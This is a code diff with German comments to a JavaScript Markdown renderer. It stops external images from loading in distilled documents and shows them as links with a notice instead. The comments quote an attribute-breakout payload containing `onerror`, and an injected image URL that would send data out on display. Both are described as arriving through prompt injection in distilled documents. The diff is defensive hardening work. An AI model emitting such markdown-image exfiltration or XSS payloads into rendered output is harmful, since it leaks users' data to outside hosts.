@@ -82,7 +82,7 @@
         });
 
         // Bilder VOR den Links: `![alt](url)` ist sonst ein Link mit `!` davor.
-        // Erlaubt sind nur data:-Bilder (unsere eingebetteten) und http(s).
+        // Geladen werden nur data:-Bilder (unsere eingebetteten); http(s) wird Link.
         // ⚠ Das fertige <img> wird WEGGESICHERT wie ein Codeblock (Code-Review
         // 2026-10-07): sonst griff die Linkregel danach IN das alt-Attribut –
         // `![[t](https://q)](https://a/onerror=…)` schloss mit dem `"` des
@@ -90,9 +90,20 @@
         // per Prompt-Injection in einem destillierten Dokument).
         var bilder = [], bli = 0;
         s = s.replace(/!\[([^\]]*)\]\(([^)\s]+)\)/g, function (m, alt, url) {
-            if (/^data:image\/(png|jpe?g|gif|webp|bmp);base64,[A-Za-z0-9+/=]+$/.test(url)
-                || /^https?:\/\//.test(url)) {
+            if (/^data:image\/(png|jpe?g|gif|webp|bmp);base64,[A-Za-z0-9+/=]+$/.test(url)) {
                 bilder.push('<img src="' + url + '" alt="' + alt + '">');
+                return '\u0000BILD' + (bli++) + '\u0000';
+            }
+            // Fremde Bilder werden NICHT geladen (Pentest-Vorbereitung
+            // 2026-11-05): das Destillat entsteht aus Fremddokumenten, und ein
+            // eingeschleustes ![x](https://fremd/?d=...) schickte beim blossen
+            // Anzeigen Daten weg. Stattdessen ein Link mit Hinweis.
+            if (/^https?:\/\//.test(url)) {
+                var hw = esc(t('media.ext_img'));
+                bilder.push('<a href="' + url + '" target="_blank" rel="noopener noreferrer"'
+                    + ' class="wi-dest-img-extern" title="' + hw + '">'
+                    + (alt || esc(t('media.ext_img_label'))) + '</a>'
+                    + ' <span class="wi-dest-img-extern-hinweis">(' + hw + ')</span>');
                 return '\u0000BILD' + (bli++) + '\u0000';
             }
             return alt || '';   // alles andere: nur der Alt-Text
